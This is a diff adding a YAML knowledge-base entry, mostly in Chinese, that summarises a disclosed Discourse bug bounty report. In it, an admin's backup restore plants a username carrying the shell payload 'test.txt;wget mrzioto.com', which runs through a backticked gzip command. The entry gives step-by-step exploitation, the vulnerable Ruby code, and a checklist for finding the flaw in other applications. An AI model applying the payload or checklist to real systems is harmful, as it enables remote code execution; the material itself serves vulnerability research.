@@ -1,0 +1,83 @@
+name: "管理员备份恢复注入污染字段——触发后台功能 Shell 命令拼接 RCE"
+id: "ADMIN_RESTORE_TAINTED_FIELD_SHELL_INJECTION"
+applicable: "both"
+phase: "chain"
+also_phases: ["input"]
+tags: ["command-injection", "backup-restore", "shell-metacharacter", "admin-escalation", "backtick", "gzip", "discourse", "ruby"]
+source: "https://hackerone.com/reports/214022"
+
+# ——— L3 核心 ———
+
+observation: >
+  ExportCsvFile 的 file_name_prefix 构造中直接插值了 @current_user.username，
+  然后在 gzip 命令中用反引号执行：`gzip -5 #{absolute_path}`。
+  虽然应用限制了用户名的特殊字符，但管理员可以通过备份恢复功能修改数据库中的 username。
+  (原文: "The username is placed inside of a gzip command in backticks.
+  Although the application prevents special characters in usernames,
+  an admin is able to make modifications to the database via the restore from backup feature.")
+
+hypothesis: >
+  如果管理员通过备份恢复功能将用户名修改为包含 shell 元字符的值
+  （如 `test.txt;wget mrzioto.com`），然后以该用户身份触发导出功能，
+  shell 元字符将在 gzip 命令中被解释执行。
+  (原文: "Modify one of the usernames of an account you have access to: test.txt;wget mrzioto.com")
+
+action_result: >
+  1. 管理员备份网站、下载归档文件
+  2. 修改归档中某用户的 username 为 `test.txt;wget mrzioto.com`
+  3. 上传修改后的归档并恢复
+  4. 以该用户登录（可通过 email 登录，不受用户名限制）
+  5. 发送 POST 请求触发用户导出：entity_type=user&entity=user_archive
+  6. 服务端执行 `gzip -5 /path/to/user-archive-test.txt;wget mrzioto.com-...csv`，
+     分号后的 wget 命令被 shell 解释执行
+  (原文: "You forced the server to make a wget leading to RCE/command injection")
+
+why_here_first: >
+  研究者审计了 ExportCsvFile 源码，发现 file_name_prefix 使用 @current_user.username
+  拼接进 gzip 反引号命令的代码流。常规输入验证阻止了直接注入，但研究者意识到
+  备份恢复功能可以绕过应用层输入验证直接修改数据库。
+  (原文代码流:
+  ```
+  file_name_prefix = "#{@entity.split('_').join('-')}-#{@current_user.username}-..."
+  file_name = "#{file_name_prefix}-#{file.id}.csv"
+  absolute_path = "#{UserExport.base_directory}/#{file_name}"
+  `gzip -5 #{absolute_path}`
+  ```)
+
+chaining: >
+  两环链：
+  1. 管理员备份恢复绕过应用层输入验证 → 数据库中植入含 shell 元字符的字段值
+  2. 触发 ExportCsvFile → username 被拼接进 gzip 反引号命令 → RCE
+
+# ——— 落地检查清单 ———
+
+approach: >
+  识别管理员备份/恢复/导入功能可直接写入数据库的场景，
+  寻找应用中使用数据库字段值拼接进 shell 命令（反引号/system/exec 字符串形式）的功能，
+  通过备份恢复绕过应用层输入验证注入 shell 元字符，间接触发命令注入。
+
+reasoning_chain:
+  - "问：应用是否有管理员备份/恢复/导入功能，允许直接加载数据到数据库？"
+  - "问：恢复功能是否绕过了应用层的字段验证（如 username 格式校验）？"
+  - "白盒：搜索代码中的反引号执行和 system/exec 字符串形式调用"
+  - "问：这些 shell 命令中是否使用了数据库字段值（如 username/filename/路径）？"
+  - "如果使用了 → 该字段是否可通过备份恢复/导入/数据库管理界面注入特殊字符？"
+  - "如果可以 → 构造含 shell 元字符的字段值，通过恢复功能写入数据库"
+  - "问：以包含恶意字段的用户身份触发相关功能（如导出/归档/报告生成），命令是否被执行？"
+
+vuln_root: >
+  应用层输入验证和数据库写入是两个独立环节——备份恢复直接操作数据库绕过了应用层校验，
+  而后台功能在使用数据库字段值构造 shell 命令时没有重新转义/验证。
+
+transferable_to:
+  - "任何提供管理员备份/恢复/导入功能的 Web 应用（Discourse、WordPress、GitLab、Redmine 等）"
+  - "应用中存在 shell 命令拼接且参数来源于数据库字段的场景（报告生成、文件导出、归档打包）"
+  - "数据库管理界面（如 phpMyAdmin、Adminer）可直接编辑记录的场景"
+  - "管理员可通过 API 修改用户属性但未经过与前端相同验证的场景"
+
+cases:
+  - url: "https://hackerone.com/reports/214022"
+    note: >
+      Discourse ExportCsvFile，$512。管理员通过 backup restore 将 username
+      修改为含分号的值，触发 user_archive 导出时 gzip 反引号命令注入 RCE。
+      研究者 ziot（Matthew Bryant），2017 年。
